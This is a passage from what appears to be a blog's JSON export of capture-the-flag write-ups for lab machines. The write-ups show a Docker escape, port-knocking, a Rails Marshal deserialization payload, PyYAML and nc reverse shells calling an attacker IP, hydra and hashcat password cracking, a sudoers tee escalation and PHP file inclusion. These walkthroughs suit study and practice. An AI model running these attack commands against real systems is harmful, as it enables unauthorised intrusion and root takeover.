&lt;hydragyrum@example. com&gt;Date:  Wed Jan 6 20:51:39 2021 +0000  Added the flag and dev noteshttp://10. 10. 50. 223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;git%20--git-dir%20/root/. git%20diff%20a3d30a7d0510dc6565ff9316e3fb84434916dee8 diff --git a/dev-note. txt b/dev-note. txtdeleted file mode 100644index 89dcd01. . 0000000--- a/dev-note. txt+++ /dev/null@@ -1,9 +0,0 @@-Hey guys,--I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin. --Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port. --Cheers,--Hydra\ No newline at end of filediff --git a/flag. txt b/flag. txtdeleted file mode 100644index aae8129. . 0000000--- a/flag. txt+++ /dev/null@@ -1,3 +0,0 @@-You found the root flag, or did you?--THM{0c------------REDACTED--------76}\ No newline at end of fileAnd we have flag for root flag. As we can see there is knocked ports. then i’m check the port of docker is off. $ nmap -p 2375 10. 10. 50. 223 Starting Nmap 7. 91 ( https://nmap. org ) at 2021-02-19 22:08 WIBNmap scan report for 10. 10. 50. 223Host is up (0. 35s latency). PORT   STATE SERVICE2375/tcp closed dockerNmap done: 1 IP address (1 host up) scanned in 0. 86 secondsNow let’s knocking that ports then we will be able to access the docker. I’m make little script for knocking : #! /bin/bashcurl $1:42 -m 1sleep 1curl $1:1337 -m 1sleep 1curl $1:10420 -m 1sleep 1curl $1:6969 -m 1sleep 1curl $1:63000 -m 1Let’s run this : . /knock 10. 10. 50. 223. After run we check again the port of docker $ nmap -p 2375 10. 10. 50. 223Starting Nmap 7. 91 ( https://nmap. org ) at 2021-02-19 22:15 WIBNmap scan report for 10. 10. 50. 223Host is up (0. 47s latency). PORT   STATE SERVICE2375/tcp open dockerNmap done: 1 IP address (1 host up) scanned in 1. 77 secondsDocker: Now port of docker is open, Now lets check this. docker -H 10. 10. 50. 223:2375 info $ docker -H 10. 10. 50. 223:2375 info                                   130 ⨯ 1 ⚙Client: Context:  default Debug Mode: false Plugins: app: Docker App (Docker Inc. , v0. 9. 1-beta3) buildx: Build with BuildKit (Docker Inc. , v0. 5. 1-docker)Server: Containers: 4 Running: 4 Paused: 0 Stopped: 0 Images: 27 Server Version: 20. 10. 2 Storage Driver: overlay2 Backing Filesystem: extfs Supports d_type: true Native Overlay Diff: true Logging Driver: json-file Cgroup Driver: cgroupfs Cgroup Version: 1 Plugins: Volume: local Network: bridge host ipvlan macvlan null overlay Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog Swarm: inactive Runtimes: io. containerd. runc. v2 io. containerd. runtime. v1. linux runc Default Runtime: runc Init Binary: docker-init containerd version: 269548fa27e0089a8b8278fc4fc781d7f65a939b runc version: ff819c7e9184c13b7c2607fe6c30ae19403a7aff init version: de40ad0 Security Options: apparmor seccomp  Profile: default Kernel Version: 4. 15. 0-130-generic Operating System: Ubuntu 18. 04. 5 LTS OSType: linux Architecture: x86_64 CPUs: 1 Total Memory: 983. 2MiB Name: great-escape. thm ID: FDCS:BLAR:AJNY:PW6Y:DVAY:R5IQ:VNLF:WRQ5:FP6Y:2IB5:U37T:3W6L Docker Root Dir: /var/lib/docker Debug Mode: false Registry: https://index. docker. io/v1/ Labels: Experimental: false Insecure Registries: 127. 0. 0. 0/8 Live Restore Enabled: falseWARNING: API is accessible on http://0. 0. 0. 0:2375 without encryption.     Access to the remote API is equivalent to root access on the host. Refer     to the 'Docker daemon attack surface' section in the documentation for     more information: https://docs. docker. com/engine/security/security/#docker-daemon-attack-surfaceWARNING: No swap limit supportAccess Docker: Then we can access the docker. First lets check the image of docker : $ docker -H 10. 10. 50. 223:2375 images $ docker -H 10. 10. 50. 223:2375 ps Escape From Docker: in this case im going to exploit alpine to escape the docker. here the link i found for exploit this. docker -H 10. 10. 50. 223:2375 run -v /:/mnt --rm -it alpine:3. 9 chroot /mnt bash $ docker -H 10. 10. 50. 223:2375 run -v /:/mnt --rm -it alpine:3. 9 chroot /mnt bash               1 ⚙groups: cannot find name for group ID 11To run a command as administrator (user  root ), use  sudo &lt;command&gt; . See  man sudo_root  for details. root@0f47e2d39595:/# iduid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)root@0f47e2d39595:/# cd /rootroot@0f47e2d39595:~# lsflag. txtroot@0f47e2d39595:~# cat flag. txt Congrats, you found the real flag!THM{c----------REDACTED------------4}root@0f47e2d39595:~#Boom we can escape the docker. Now for looking the flag of web we can access frontend in the docker. $ docker -H 10. 10. 50. 223:2375 exec -it dockerescapecompose_frontend_1 /bin/bash After looking around i found this in nginx: root@docker-escape:/usr/share/nginx/html/. well-known# cat security. txt Hey you found me!The security. txt file is made to help security researchers and ethical hackers to contact the company about security issues. See https://securitytxt. org/ for more information. Ping /api/fl46 with a HEAD request for a nifty treat. so We can curl head of /api/fl46. $ curl --HEAD http://10. 10. 50. 223/api/fl46HTTP/1. 1 200 OKServer: nginx/1. 19. 6Date: Fri, 19 Feb 2021 15:32:04 GMTConnection: keep-aliveflag: THM{b8--------REDACTED------------d4}We have flag of web now. so that’s all the writeup that I made now we have 3 flags, including on the web, docker, and the machine from the box Happy hacking :D "
    }, {
    "id": 18,
    "url": "/writeup-tryhackme-inferno/",
    "title": "Tryhackme Inferno",
    "body": "2021/02/16 - Introduction: This is partical room from Tryhackme entitled Inferno with Medium difficulty. In this room we will learn about exploit HTTP basic auth and IDE Exploit and Linux Privilage escalation . In this case we will find the vulnerability in Codiad (CVE-2017-15689) without further ado, let’s just start. link this room here Enumeration: Nmap: $ nmap -sC -sV 10. 10. 51. 44    Starting Nmap 7. 91 ( https://nmap. org ) at 2021-02-16 22:51 WIBNmap scan report for 10. 10. 51. 44Host is up (0. 35s latency). Not shown: 978 closed portsPORT   STATE SERVICE    VERSION21/tcp  open ftp?22/tcp  open ssh      OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)|_ 256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)23/tcp  open tcpwrapped25/tcp  open tcpwrapped|_smtp-commands: Couldn't establish connection on port 2580/tcp  open http     Apache httpd 2. 4. 29 ((Ubuntu))                                                                    |_http-server-header: Apache/2. 4. 29 (Ubuntu)                                                                           |_http-title: Dante's Inferno                                                                             88/tcp  open tcpwrapped                                                                                     106/tcp open pop3pw?                                                                                      110/tcp open tcpwrapped                                                                                     389/tcp open tcpwrapped                                                                                     443/tcp open tcpwrapped                                                                                     464/tcp open tcpwrapped                                                                                     636/tcp open tcpwrapped777/tcp open tcpwrapped783/tcp open tcpwrapped808/tcp open ccproxy-http?873/tcp open tcpwrapped1001/tcp open webpush?1236/tcp open tcpwrapped1300/tcp open tcpwrapped2000/tcp open tcpwrapped5432/tcp open tcpwrapped6346/tcp open tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 143. 35 secondsNmap outputs multiple ports, but in this case we’re only targeting ports 22 and 80, Now lets take a look port 80.  I’m using go buster and i found /inferno, Now lets look at this : In this form login i want to use hydra to bruteforce password of admin, lets do this. $ hydra -l admin -P /home/razor/Documents/Wordlist/rockyou. txt 10. 10. 51. 44 http-get /inferno/ -I -t 64 We did it to get the password from the admin user, now we can login with the admin After we login in codiad and post login we can see the page like this.  Foothold: after i did some research, i found CVE-2017-15689 which we can see here. Now lets exploit this :  Here we just need to enter a command like this: $ sudo python exploit. py http://admin:dante1@10. 10. 51. 44/inferno/ admin dante1 10. 2. 47. 251 1234 linux Seccond Term : $ echo 'bash -c  bash -i &gt;/dev/tcp/10. 2. 47. 251/1235 0&gt;&amp;1 2&gt;&amp;1 ' | nc -lnvp 1234  Third Term : $ nc -lnvp 1235but here there is a problem where bash will exit after a few seconds, so here I use /bin/sh to get a stable shell. After looking around i found . download. dat in home directory dante : /home/dante/Downloads/. download. dat And there is HEX code, We can Decode to ASCII with xxd : $ cat hexcred|xxd -r -p Now we found credential for dante, Then we can login with ssh to user dante : Privilage Escalation: In this case we can exploit /usr/bin/tee and getting a root. I got this from GTFObins Exploit : $ echo  dante ALL=(ALL) ALL | sudo tee -a /etc/sudoers o tee -a /etc/sudoers Since the dante user has full ‘tee’ access, we can edit all configuration files to get root Now we are root!! Happy hacking :D "
    }, {
    "id": 19,
    "url": "/writeup-hackthebox-jewel/",
    "title": "Hackthebox Jewel",
    "body": "2021/02/15 - Introduction: This is partical room from hackthebox entitled jewel with Medium difficulty. In this room we will learn about code analysis of a Ruby on Rails web application . This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE. After archiving a foothold, we get command execution in the context of the unprivileged user and in this room using oathtool for google authentication . room link here Enumeration: Nmap: First time we have to do is scanning the Machine : $ sudo nmap 10. 10. 10. 211 -sC -sV[sudo] password for razor: Starting Nmap 7. 91 ( https://nmap. org ) at 2021-02-16 01:19 WIBNmap scan report for 10. 10. 10. 211Host is up (0. 25s latency). Not shown: 997 filtered portsPORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 7. 9p1 Debian 10+deb10u2 (protocol 2. 0)| ssh-hostkey: |  2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)|  256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)|_ 256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)8000/tcp open http  Apache httpd 2. 4. 38|_http-generator: gitweb/2. 20. 1 git/2. 20. 1| http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION|_http-server-header: Apache/2. 4. 38 (Debian)| http-title: 10. 10. 10. 211 Git|_Requested resource was http://10. 10. 10. 211:8000/gitweb/8080/tcp open http  nginx 1. 14. 2 (Phusion Passenger 6. 0. 6)|_http-server-header: nginx/1. 14. 2 + Phusion Passenger 6. 0. 6|_http-title: BL0G!Service Info: Host: jewel. htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35. 72 secondsfrom the results issued by nmap we get 3 open ports where port 22 is ssh, port 8000 is apache webserver, and port 8080 is nginx. now lets check port 8000 first and look at sumarry There is a git repo and we can download snapshot from this repository wget '10. 10. 10. 211:8000/gitweb/?p=. git;a=snapshot;h=HEAD;sf=tgz' -O snapshot. tgztar xvzf snapshot. tgzcd . git-5d6f436 Let’s take a look at this, Gemfile shows the version of rails which will be released in 2020. After I did some research I found a CVE where we can deserialization vulnerability leading to RCE. The vulnerability is indicated by the presence of the raw: true option code, which can trigger untrusted string deserialization in marshal. here I am using grep to find vulnerable code : here we can see the output of grep where there are 2 vulnerabilities here, such as:  users_controller. rb   def update @user = User. find(params[:id]) if @user &amp;&amp; @user == current_user  cache = ActiveSupport::Cache::RedisCacheStore. new(url:  redis://127. 0. 0. 1:6379/0 )  cache. delete( username_#{session[:user_id]} )  @current_username = cache. fetch( username_#{session[:user_id]} , raw: true) {user_params[:username]}  if @user. update(user_params)   flash[:success] =  Your account was updated successfully    redirect_to articles_path  else   cache. delete( username_#{session[:user_id]} )   render 'edit'  end else  flash[:danger] =  Not authorized   redirect_to articles_path endend  application_controller. rb  def current_username if session[:user_id]  cache = ActiveSupport::Cache::RedisCacheStore. new(url:  redis://127. 0. 0. 1:6379/0 )  @current_username = cache. fetch( username_#{session[:user_id]} , raw: true) do   @current_user = current_user   @current_username = @current_user. username  end else  @current_username =  guest  end return @current_usernameend This method is an update that is called when the user updates and sets the username_id value without any checking and cleaning. After i did a search here i saw user. rb which contains code like username must be unique between 3 to 25 characters long and contain only alphanumeric characters class User &lt; ActiveRecord::Base has_many :articles has_secure_password VALID_USER_REGEX = /\A[\w\d]+\z/ VALID_EMAIL_REGEX = /\A[\w+\-. ]+@[a-z\d\-. ]+\. [a-z]+\z/i validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 },           format: { with: VALID_USER_REGEX } validates :email, presence: true, length: { maximum: 105 }, uniqueness: { case_sensitive: false },          format: { with: VALID_EMAIL_REGEX } before_save { self. email = email. downcase }endThis logic is very bad, because the serial marshal object is dangerous if set as the username, it is also written to the cache, and fails to update the database. Cached objects must be deleted immediately because no deletion will cause server errors and the operation to be aborted. this will allow the attacker to store arbitrary serial code and will trigger its deserialization which may result in code execution (RCE) Foothold: Vulnerability is in update profile user, we can register at here http://10. 10. 10. 211:8080/signup. After that, click on profile and you can edit username After registration you can also login. Now lets install rails and go to folder then we can build payload based on github $ sudo apt install rails$ rails new ex$ cd ex$ rails console before we go in console you must set Netcat listener for revershell in another terminal, if you done let’s build some payload : &gt; code='`/bin/bash -c  bash -i &amp;&gt;/dev/tcp/10. 10. 14. 54/4444 0&gt;&amp;1 `'&gt; erb=ERB. allocate&gt; erb. instance_variable_set:@src, code&gt; erb. instance_variable_set:@filename,  1 &gt; erb. instance_variable_set:@lineno, 1&gt; payload=Marshal. dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy. new erb,:result)&gt; require'uri'&gt; puts URI. encode_www_form(payload:payload) Now i have payload : payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3E%60%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10. 10. 14. 54%2F4444+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09TNow lets exploit this. in this case i’m using burpsuite to put the payload in username Before update user you must turn on intercept in burpsuitechange username to payload for revershell and after that you can forward and intercept of then look at your browserin this case dont reload the page but just enter on address. then you must be getting a shellNow we have user bill Privilage Escalation: After I went around and did the enumeration of the file system I found this /var/backups/dump_2020-08-27. sql and i found username and hash of password : echo '$2a$12$QqfetsTSBVxMXpnTR. JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW' &gt; pas_hashecho '$2a$12$sZac9R2VSQYjOcBTTUYy6. Zd. 5I02OnmkKnD3zA6MqMrzLKz0jeDO' &gt;&gt; pas_hashIn this case im using hashcat for crack the password : and I managed to get one of those two hashes $ hashcat -D 2 -m 3200 hashes ~/Documents/Wordlist/rockyou. txt --show                   130 ⨯$2a$12$QqfetsTSBVxMXpnTR. JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW:spongeboblets check this : bill@jewel:~$ sudo -l[sudo] password for bill: Verification code: user using google authenticator and as you can see we have folder . google_authenticator we can use this secret key to generate OTP on our machines apt install oathtooloathtool -b --totp '2UQI3R52WFCLE6JTLDCSJYMJH4  note : your time must be the same as the time in the jewel machine, you can change it by means of timedatectl or date -s The GTFOBins repo provides an example of how this binary can be abused in order to get a rootshell. Link gem open -e  /bin/sh -c /bin/sh  rdoc Boom!!! We are root now Happy hacking :D "
    }, {
    "id": 20,
    "url": "/writeup-tryhackme-en-pass/",
    "title": "Tryhackme En-pass",
    "body": "2021/02/14 - Introduction: This is partical room from tryhackme entitled En-pass with Medium difficulty. In this room we will learn about web exploitation and privilage escalation . room link here Enumeration: Nmap: what we have to do first is scanning the ip : $ nmap -sC -sV -oA nm 10. 10. 144. 190Nmap scan report for 10. 10. 144. 190Host is up (0. 33s latency). Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 7. 2p2 Ubuntu 4ubuntu2. 10 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)|  256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)|_ 256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)8001/tcp open http  Apache httpd 2. 4. 18 ((Ubuntu))|_http-server-header: Apache/2. 4. 18 (Ubuntu)|_http-title: En-PassService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelas you can see we just have 2 port open which ssh and webserver. Now, lets take a look at webserver : gobuster: We don’t find anything here, so let’s search some directories or file using the gobuster or wfuzz tools $ gobuster dir -u http://10. 10. 88. 227:8001/ -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2. 3-medium. txt -x php===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:      http://10. 10. 88. 227:8001/[+] Threads:    10[+] Wordlist:    /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2. 3-medium. txt[+] Status codes:  200,204,301,302,307,401,403[+] User Agent:   gobuster/3. 0. 1[+] Extensions:   php[+] Timeout:    10s===============================================================2021/02/14 22:32:30 Starting gobuster===============================================================/web (Status: 301)/reg. php (Status: 200)/403. php (Status: 403)/zip (Status: 301)Progress: 6719 / 220561 (3. 05%)after scanning we have 2 directory and 2 file . php. now lets check directory web :on this web directory we continue to search the directory until we find the key file $ gobuster dir -u http://10. 10. 88. 227:8001/web/resources/infoseek/configure/ -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2. 3-medium. txt ===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:      http://10. 10. 88. 227:8001/web/resources/infoseek/configure/[+] Threads:    10[+] Wordlist:    /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2. 3-medium. txt[+] Status codes:  200,204,301,302,307,401,403[+] User Agent:   gobuster/3. 0. 1[+] Timeout:    10s===============================================================2021/02/14 22:43:57 Starting gobuster===============================================================/key (Status: 200)Progress: 2214 / 220561 (1. 00%) Exploit: now we have keys like id_rsa to get connected shell but the problem is we dont have password and username for the key. now lets go to /reg. php then if found the source code of php, you can see the source code : &lt;?phpif($_SERVER[ REQUEST_METHOD ] ==  POST ){  $title = $_POST[ title ];  if (!preg_match('/[a-zA-Z0-9]/i' , $title )){          $val = explode( , ,$title);     $sum = 0;          for($i = 0 ; $i &lt; 9; $i++){        if ( (strlen($val[0]) == 2) and (strlen($val[8]) == 3 )) {          if ( $val[5] !=$val[8] and $val[3]!=$val[7] )                   $sum = $sum+ (bool)$val[$i].  &lt;br&gt; ;         }            }     if ( ($sum) == 9 ){             echo $result;//do not worry you'll get what you need.        echo   Congo You Got It !! Nice  ;               }          else{           echo   Try Try!! ;                  }     }         else{      echo   Try Again!!  ;      }    } ?&gt;Getting password and username: after analyze the code we can exploit by putting alphanumeric characters which will break down some of our title variables into an array. In the code we have to be able to pass the title variable so that there will be 9 elements in the array. so in order to solve this we have to use 8 comma “,” in the title variable. so now I tried several possibilities and i can pass this with this code : !!,!,!,!,!,!,!,$,@@@ i will explain that why i’m using that code,You can see in the “(strlen ($ val [0]) == 2)” which means that in array 0 there must be 2 characters, the “(strlen ($ val [8]) == 3)” in the 8th array must have 3 characters and multiple checks like that.   Note : You have to try it yourself and don’t copy the password from the picture or you’ll be a fool :D now we have password but not yet for the user, so lets go to /zip So since I don’t want to spend my time looking at them one by one I will create a simple script to see all the files. this is the script that I use: nano zip. shfor i in `seq 1 100`; do wget -q http://10. 10. 88. 227:8001/zip/a$i. zip &amp;&amp; unzip a$i. zip &amp;&amp; cat a &amp;&amp; rm a &amp;&amp; rm a$i. zip; done as I guessed it is not useful at all :D, there everything outputing sadman . a bit annoying to someone make this box XD. now lets check 403. phphttp://10. 10. 88. 227:8001/403. php i got nothing but thm tell us some hint now I will check the end point with several possibilities using 403fuzzer such as X-Forwarded-For, besides this it also applies several different loads which are usually used in travesal dir or what we usually know wfuzz to each endpoint on the path  Note : This tool will check the endpoint with a couple of headers such as X-Forwarded-For It will also apply different payloads typically used in dir traversals path normalization etc. to each endpoint on the path. e. g. /%2e/test/test2 /test/%2e/test2 /test;/test2/ $ python3 403fuzzer. py -u http://10. 10. 88. 227:8001/403. php -hc 403,404Response Code: 200   Length: 2563  Path: /Response Code: 200   Length: 2563  Path: /Response Code: 400   Length: 306   Path: /%2e%2e/403. phpResponse Code: 400   Length: 306   Path: /. . /403. phpResponse Code: 200   Length: 2563  Path: /Response Code: 400   Length: 306   Path: /%2e%2e/403. phpResponse Code: 400   Length: 306   Path: /. . /. . /. . /403. phpResponse Code: 400   Length: 306   Path: /. . /. . //. . /403. phpResponse Code: 400   Length: 306   Path: /. . /. . /403. phpResponse Code: 400   Length: 306   Path: /. . /. . ;/403. phpResponse Code: 400   Length: 306   Path: /. . /. /. . /403. phpResponse Code: 400   Length: 306   Path: /. . /. ;/. . /403. phpResponse Code: 400   Length: 306   Path: /. . //. . /. . /403. phpResponse Code: 400   Length: 306   Path: /. . //. . /403. phpResponse Code: 400   Length: 306   Path: /. . /403. phpResponse Code: 400   Length: 306   Path: /. . /;/. . /403. phpResponse Code: 400   Length: 306   Path: /. . /;/403. phpResponse Code: 400   Length: 306   Path: //. . /. . /403. phpResponse Code: 400   Length: 306   Path: ///. . /403. phpResponse Code: 200   Length: 2563  Path: /Response Code: 200   Length: 2563  Path: /403. php%3b/%2e. Response Code: 200   Length: 2563  Path: /403. php%3b/. . Response Code: 200   Length: 2563  Path: /403. php/%2e%2eResponse Code: 200   Length: 2563  Path: /403. php/%2e%2e/Response Code: 200   Length: 2563  Path: /403. php/. . Response Code: 200   Length: 2563  Path: /403. php/. . /Response Code: 400   Length: 306   Path: /403. php/. . /. . /Response Code: 400   Length: 306   Path: /403. php/. . /. . /. . /Response Code: 200   Length: 2563  Path: /403. php/. . /. . /. . //Response Code: 200   Length: 2563  Path: /403. php/. . /. . //Response Code: 400   Length: 306   Path: /403. php/. . /. . //. . /Response Code: 400   Length: 306   Path: /403. php/. . /. /. . /Response Code: 200   Length: 2563  Path: /403. php/. . /. ;/. . /Response Code: 200   Length: 2563  Path: /403. php/. . //Response Code: 200   Length: 2563  Path: /403. php/. . //. . /Response Code: 400   Length: 306   Path: /403. php/. . //. . /. . /Response Code: 200   Length: 2563  Path: /403. php/. . /;/. . /Response Code: 200   Length: 917   Path: /403. php/. . ;/Response Code: 200   Length: 2563  Path: /403. php//. . /. . /as you can see we have different length Response Code: 200   Length: 917   Path: /403. php/. . ;/ I just found this bypass which I think is a bit strange and confusing. however this is a challange and we must solve it :D.  Gaining access: User: now we got a username, so we have username and password for key lets jump in to ssh : lets doing any privilage escalation, i was check it with linpeas but i’m not found any missconfiguration. so im using pspy to snooping processes without root.  pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea. so im run this and i got any hint : lets check /opt/scripts and alayze that : bash-4. 3$ cat file. py #!/usr/bin/pythonimport yamlclass Execute():    def __init__(self,file_name = /tmp/file. yml ):        self. file_name = file_name        self. read_file = open(file_name , r )    def run(self):        return self. read_file. read()data = yaml. load(Execute(). run())im try to run this but it gives us below error : which is where the error is due to the absence of the file. yml file. and im ask to uncle google and give me some suprise link. lets check if its works or not : bash-4. 3$ python -c 'import yaml; yaml. load( !!python/object/new:os. system [echo EXPLOIT!] )'EXPLOIT!bash-4. 3$and the example is works!!. Root: let’s get the shell  first i’m create file. yml at /tmp :  !!python/object/new:os. system [rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 2. 47. 251 4444 &gt;/tmp/f ]  now in attacker machines using nc -lvnp 4444 lets run file. py and get a shell of root and BOOMMM!! we got the root :D. Happy hacking :) "
    }, {
    "id": 21,
    "url": "/writeup-tryhackme-archanel/",
    "title": "Tryhackme Archangel",
    "body": "2021/02/12 - Introduction: This is partical room from tryhackme entitled archangel with easy difficulty, but for me its medium difficulty. In this room we will learn about boot2root, Web Exploitation. room link here Enumeration: nmap: First we must scanning the box with nmap for enumeration. $ sudo nmap -sC -sV 10. 10. 172. 38 Starting Nmap 7. 91 ( https://nmap. org ) at 2021-02-12 15:53 WIBNmap scan report for 10. 10. 40. 126Host is up (0. 34s latency). Not shown: 998 closed portsPORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)|  256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)|_ 256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)80/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: WavefireService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24. 49 secondsnmap tell us the box have 2 port open which is ssh and webserver. now lets check the webserver Flag 1: as you can see the webserver using mafialive. thm lets add this to hosts sudo nano /etc/hosts                         127. 0. 0. 1    localhost127. 0. 1. 1    Razor10. 10. 172. 38 mafialive. thm# The following lines are desirable for IPv6 capable hosts::1   localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersthen lets go to mafialive. thm and here the result now we got first flag, now lets looking for any directory on this web. Flag 2: gobuster dir -u http://mafialive. thm/ -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2. 3-medium. txt -x php===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:      http://mafialive. thm/[+] Threads:    10[+] Wordlist:    /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2. 3-medium. txt[+] Status codes:  200,204,301,302,307,401,403[+] User Agent:   gobuster/3. 0. 1[+] Extensions:   php[+] Timeout:    10s===============================================================2021/02/12 19:12:48 Starting gobuster===============================================================/test. php (Status: 200)Progress: 665 / 220561 (0. 30%)with gobuster we found file test. php, lets check itWe found flag 1 and when click “here is button” we going to test. php?view=/var/www/html/development_testing/mrrobot. php its just output text like echo 'control is an illusion' . now lets see the source with using filter php : script :  pHp://FilTer/convert. base64-encode/resource=  now add to test. php :   http://mafialive. thm/test. php?view=php://FilTer/convert. base64-encode/resource=/var/www/html/development_testing/test. php   File Inclusion: Output : its base64 encode, lets decode it CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== - decode : &lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;INCLUDE&lt;/title&gt;  &lt;h1&gt;Test Page. Not to be Deployed&lt;/h1&gt;   &lt;/button&gt;&lt;/a&gt; &lt;a href= /test. php?view=/var/www/html/development_testing/mrrobot. php &gt;&lt;button id= secret &gt;Here is a button&lt;/button&gt;&lt;/a&gt;&lt;br&gt;    &lt;?php      //FLAG: thm{ex----------f1}      function containsStr($str, $substr) {        return strpos($str, $substr) !== false;      }      if(isset($_GET[ view ])){      if(!containsStr($_GET['view'], '. . /. . ') &amp;&amp; containsStr($_GET['view'], '/var/www/html/development_testing')) {        include $_GET['view'];      }else{        echo 'Sorry, Thats not allowed';      }    }    ?&gt;  &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Flag 3:  TL;DR — Apache Log Poisoning     The idea behind log poisoning is to put some php code (payload) into the logs, and then load them where php will be executed. If we look at the access log, we see that on each visit to the site, there’s an entry written with the url visited and the user-agent string of the browser visiting. The simplest case would be to change our user-agent string in a such a way that it includes php code, and then include that log file with our 